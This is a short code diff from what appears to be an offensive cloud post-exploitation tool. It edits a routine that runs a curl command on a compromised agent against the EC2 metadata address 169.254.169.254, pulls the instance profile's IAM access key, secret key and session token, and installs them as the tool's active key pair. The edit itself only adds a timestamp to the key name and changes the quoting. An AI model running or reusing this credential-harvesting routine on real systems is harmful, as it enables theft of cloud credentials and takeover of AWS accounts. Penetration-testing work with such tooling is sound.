@@ -973,8 +973,8 @@ class Main:
             keys = self.server.run_cmd(target, conn, f'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{instance_profile}', mute=True)
             if '"Code" : "Success",' in keys:
                 keys = json.loads(keys)
-                self.set_keys(f'Agent{target}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
-                self.print(f"Keys successfully fetched from agent {target}\'s EC2 meta-data and set as the active key pair. They will expire at {keys['Expiration']}.\n")
+                self.set_keys(f'Agent{target}/{time.strftime("%m-%d@%I-%M%p")}', keys['AccessKeyId'], keys['SecretAccessKey'], keys['Token'])
+                self.print(f'Keys successfully fetched from agent {target}\'s EC2 meta-data and set as the active key pair. They will expire at {keys["Expiration"]}.\n')
                 return
         self.print('Failed to fetch AWS keys from the EC2 meta-data, this agent is either not an EC2 instance or it does not have a valid instance profile attached to it to fetch the keys from.\n')
         return
